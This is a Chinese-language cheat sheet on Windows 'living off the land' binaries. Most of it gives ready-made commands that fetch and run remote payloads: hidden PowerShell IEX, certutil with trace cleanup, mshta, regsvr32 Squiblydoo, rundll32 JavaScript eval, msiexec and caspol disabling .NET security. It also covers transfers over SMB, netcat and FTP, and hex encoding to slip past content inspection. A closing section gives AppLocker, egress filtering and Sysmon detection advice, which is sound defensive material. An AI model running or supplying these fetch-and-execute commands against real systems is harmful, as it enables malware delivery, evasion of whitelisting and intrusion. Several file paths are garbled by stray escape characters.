# Windows 远程文件下载与执行技术图谱及防御指南

## 概述

在 Windows 系统运维、应急响应及安全测试评估中，了解远程文件的获取与执行方式是进行威胁排查和防护加固的基础。本文档将原散乱的 Windows 文件下载与执行技巧进行系统化梳理与归类，修正代码规范，扩充了最新的原生系统工具（LOLBins），并补充了系统级的检测与防御加固建议。

---

## 姿势汇总矩阵

| 分类 | 工具 / 方法 | 文件落地 | 依赖环境 | 常见载体 / 协议 |
| :--- | :--- | :---: | :--- | :--- |
| **原生系统工具 (LOLBins)** | PowerShell | 可选 | Windows 默认内置 | HTTP / HTTPS / TCP |
| | Certutil.exe | 是 | Windows 默认内置 | HTTP / HTTPS |
| | Bitsadmin.exe | 是 | Windows 默认内置 | HTTP / HTTPS |
| | Curl.exe *(补充)* | 是 | Win10 (1803+) 默认内置 | HTTP / HTTPS / FTP |
| | Desktopimgdownldr.exe *(补充)* | 是 | Win10+ 默认内置 | HTTP / HTTPS |
| | Esentutl.exe / MpCmdRun.exe *(补充)* | 是 | Windows / Windows Defender | HTTP / HTTPS |
| **白名单与脚本宿主执行** | Mshta.exe | 否 / 可选 | Windows 默认内置 | HTA / VBScript / JScript |
| | Regsvr32.exe | 否 | Windows 默认内置 | SCT / COM 组件 |
| | Rundll32.exe | 否 | Windows 默认内置 | DLL / JScript |
| | Msiexec.exe | 是 | Windows 默认内置 | MSI 安装包 |
| | IEExec.exe | 是 | .NET Framework 附带 | .NET EXE |
| | MSXSL.exe | 否 / 可选 | 需独立下载扩展 | XML / XSLT JScript |
| | Pubprn.vbs | 否 | Windows 7+ 默认脚本 | SCT Scriptlet |
| | CSC.exe | 是 | .NET Framework 附带 | C# 源代码动态编译 |
| **网络协议与共享** | IPC$ / SMB 共享 | 是 | TCP 445 / 139 开放 | SMB / 命名管道 |
| | FTP / TFTP | 是 | FTP/TFTP 服务端 | TCP 21 / UDP 69 |
| | WinSCP | 是 | SFTP / SSH 端口 | SSH / SFTP |
| | Netcat (NC) | 是 | 独立二进制工具 | RAW TCP |
| **编码转换与交互式通道** | Notepad 记事本 | 是 | GUI 交互权限 | HTTP / UNC 路径 |
| | Nishang (ExeToText) | 是 | PowerShell 环境 | Hex 文本转换 |

---

## 一、 原生命令行与系统工具 (LOLBins)

### 1. PowerShell

PowerShell 是 Windows 原生的强大脚本环境，支持通过 .NET 库直接发起网络请求。

*   **下载文件到本地：**
    ```powershell
    powershell -nop -w hidden -c "(New-Object System.Net.WebClient).DownloadFile('http://192.168.28.128/imag/evil.txt', 'C:\Windows\Temp\evil.exe')"
    ```
*   **内存中远程加载执行（无文件落地）：**
    ```powershell
    powershell -nop -w hidden -c "IEX ((New-Object Net.WebClient).DownloadString('http://192.168.28.128/imag/script.ps1'))"
    ```

### 2. Certutil

`certutil.exe` 原用于证书管理，但因其具备 URL 缓存下载功能，经常被用作文件下载器。**注意：** 容易在本地证书缓存目录留下痕迹，需及时清理。

*   **下载文件：**
    ```cmd
    certutil -urlcache -split -f http://192.168.28.128/imag/evil.txt C:\Windows\Temp	est.exe
    ```
*   **清除缓存痕迹：**
    ```cmd
    certutil -urlcache -split -f http://192.168.28.128/imag/evil.txt delete
    ```
    *默认缓存路径：*%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content*

### 3. Bitsadmin

Windows 后台智能传输服务（BITS）管理工具，适合异步传输大文件。

```cmd
bitsadmin /transfer myDownloadJob /download /priority foreground http://192.168.28.128/imag/evil.txt C:\Windows\Temp.exe
```

### 4. Curl (Windows 10 / Server 2019+ 补充)

Windows 10 1803 版本后默认内置了原生 `curl.exe` 工具。

```cmd
curl -o C:\Windows\Temp\evil.exe http://192.168.28.128/imag/evil.txt
```

### 5. Desktopimgdownldr (Windows 10+ 补充)

Windows 锁定屏幕个人化设置相关的内置二进制文件，可以被利用作为隐蔽下载通道。

```cmd
set "SYSTEMROOT=C:\Windows\Temp" && desktopimgdownldr.exe /lockscreenurl:http://192.168.28.128/imag/evil.txt /level:desktop
```

### 6. Wget (非原生/需编译库)

若系统环境安装有 Windows 版本的 Wget：

```cmd
wget -O "C:\Windows\Temp\evil.exe" http://192.168.28.128/imag/evil.txt
```

---

## 二、 白名单与脚本宿主执行 (AppLocker/WDAC Bypass)

### 1. Mshta

`mshta.exe` 用于执行 `.hta`（HTML Application）文件，能够解析并运行其中的 VBScript 或 JScript 代码。

*   **远程直接执行：**
    ```cmd
    mshta http://192.168.28.128/run.hta
    mshta vbscript:Close(Execute("GetObject(""script:http://192.168.28.128/payload.sct"")"))
    ```
*   **HTA 模板示例 (`run.hta`)：**
    ```html
    <HTML>
    <HEAD>
    <script language="VBScript">
        Window.ReSizeTo 0, 0
        Window.moveTo -2000, -2000
        Set objShell = CreateObject("WScript.Shell")
        objShell.Run "cmd.exe /c calc.exe", 0, True
        self.close
    </script>
    </HEAD>
    <BODY>demo</BODY>
    </HTML>
    ```

### 2. Regsvr32 (Squiblydoo 技巧)

`regsvr32.exe` 用于向系统注册 COM 组件，结合 `scrobj.dll` 可以远程加载加载并运行 `.sct` 脚本（无文件落地）。

*   **执行命令：**
    ```cmd
    regsvr32.exe /u /n /s /i:http://192.168.28.131:8888/file.sct scrobj.dll
    ```
*   **SCT 文件结构示例 (`file.sct`)：**
    ```xml
    <?XML version="1.0"?>
    <scriptlet>
    <registration progid="ShortJSRAT" classid="{10001111-0000-0000-0000-0000FEEDACDC}">
        <script language="JScript">
            <![CDATA[
                var r = new ActiveXObject("WScript.Shell").Run("calc.exe", 0, true);
            ]]>
        </script>
    </registration>
    </scriptlet>
    ```

### 3. Rundll32

利用 `mshtml.dll` 的 `RunHTMLApplication` 接口远程解析运行 JavaScript。

```cmd
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://192.168.28.131:8888/connect",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}
```

### 4. Msiexec

`msiexec.exe` 是 Windows Installer 的命令行解释器，支持远程加载安装包。

*   **远程执行 MSI 安装文件：**
    ```cmd
    msiexec /q /i http://192.168.28.128/evil.msi
    ```

### 5. IEExec

`.NET Framework` 附带程序，通过 CASPOL 禁用安全策略后，可直接从 URL 加载运行 .NET 二进制文件。

```cmd
C:\Windows\Microsoft.NET\Framework642.0.50727\caspol.exe -s off
C:\Windows\Microsoft.NET\Framework642.0.50727\IEExec.exe http://192.168.28.131/evil.exe
```

### 6. MSXSL.exe

微软发布的命令行 XSLT 处理工具，可以通过加载远程 XML 与 XSL 文件触发脚本执行。

*   **执行命令：**
    ```cmd
    msxsl.exe http://192.168.28.128/scripts/demo.xml http://192.168.28.128/scripts/exec.xsl
    ```
*   **`exec.xsl` 核心构造：**
    ```xml
    <?xml version='1.0'?>
    <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:user="http://mycompany.com/mynamespace">
    <msxsl:script language="JScript" implements-prefix="user">
       function xml(nodelist) {
           var r = new ActiveXObject("WScript.Shell").Run("cmd /c calc.exe");
           return nodelist.nextNode().xml;
       }
    </msxsl:script>
    <xsl:template match="/">
       <xsl:value-of select="user:xml(.)"/>
    </xsl:template>
    </xsl:stylesheet>
    ```

### 7. Pubprn.vbs

Windows 7+ 内置的已签名 WSH 打印机脚本（路径：`C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs`），可通过 Script Moniker 解析 `.sct` 凭据。

```cmd
cscript /b C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs 127.0.0.1 script:http://192.168.28.128/test.sct
```

### 8. Csc.exe (C# 动态编译)

Windows 默认安装的 .NET 框架附带 C# 命令行编译器 `csc.exe`，可通过在目标机器上编译源码生成可执行文件。

*   **源码编译：**
    ```cmd
    C:\Windows\Microsoft.NET\Framework4.0.30319\csc.exe /out:C:\Windows\Temppp.exe C:\Windows\Temppp.cs
    ```

---

## 三、 网络协议与共享传输

### 1. IPC$ 与 SMB 共享

利用网络共享资源建立连接，进行文件跨主机传输。

```cmd
# 建立 IPC$ 连接
net use \192.168.28.128\ipc$ /user:administrator "Password123!"

# 复制共享文件到本地
copy \192.168.28.128\c$\evil.exe D:	est\evil.exe
```

### 2. FTP / TFTP

*   **非交互式 FTP 脚本：**
    将以下指令写入文本（如 `ftp.txt`）后使用 `ftp -s:ftp.txt` 执行：
    ```text
    open 192.168.28.128
    username
    password
    get evil.exe
    quit
    ```
*   **TFTP（UDP 协议）：**
    ```cmd
    tftp -i 192.168.28.128 GET evil.exe C:\Windows\Temp\evil.exe
    ```

### 3. WinSCP / Netcat

*   **WinSCP 命令行传输：**
    ```cmd
    winscp.exe /console /command "option batch continue" "option confirm off" "open sftp://user:pass@192.168.28.131:22" "get /tmp/evil.exe C:	est" "exit"
    ```
*   **Netcat RAW TCP 传输：**
    ```cmd
    # 接收端（目标主机）
    nc -l -p 4444 > evil.exe

    # 发送端
    nc 192.168.28.128 4444 < evil.exe
    ```

---

## 四、 编码转换与特殊 GUI 通道

### 1. Notepad 记事本打开对话框

在具备图形界面（RDP/远程桌面）但限制浏览器启动的环境中：
1. 打开 `notepad.exe`
2. 点击 **文件 -> 打开** (`Ctrl + O`)
3. 在文件名框中输入远程 URL 或 UNC 路径（例如 `\192.168.28.128\share\evil.exe` 或 `http://...`），按回车触发下载。

### 2. Nishang ExeToText / TextToExe (Hex 编码传输)

利用 PowerShell 将二进制文件转换为 HEX 文本以绕过文本审查，传输后再还原。

```powershell
# 二进制转 Hex 文本
.\ExetoText.ps1 evil.exe evil.txt

# Hex 文本还原为二进制
.\TexttoExe.ps1 evil.txt evil_restored.exe
```

---

## 五、 安全防护与检测缓解建议 (Defense Guide)

针对基于系统原生理工具（LOLBins）的网络下载与隐蔽执行，企业安全运维应采取以下纵深防御措施：

1.  **应用白名单管控 (AppLocker / WDAC)：**
    *   限制 `Certutil.exe`、`Mshta.exe`、`Regsvr32.exe`、`Rundll32.exe` 等白名单工具的非授权执行。
    *   通过 WDAC 策略屏蔽无签名的 `.sct`、`.hta`、`.vbs` 脚本运行。

2.  **网络层出站策略过滤：**
    *   针对高危内置程序（如 `certutil.exe`、`mshta.exe`、`bitsadmin.exe`）阻断其直接向外网非公认 IP 建立 HTTP/HTTPS 出站连接。

3.  **系统日志与 Sysmon 监控规则：**
    *   开启 **系统审核策略 - 进程创建审核 (Event ID 4688)** 并记录命令行参数。
    *   配置 **Sysmon** 监控重点事件：
        *   **Event ID 1 (进程创建)：** 关注命令行中包含 `-urlcache`、`http://`、`https://`、`scrobj.dll`、`RunHTMLApplication` 等关键词。
        *   **Event ID 3 (网络连接)：** 监控 `certutil.exe`、`mshta.exe` 等异常发起的出站网络请求。
        *   **Event ID 11 (文件创建)：** 重点关注 `%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content` 下的缓存文件变动。
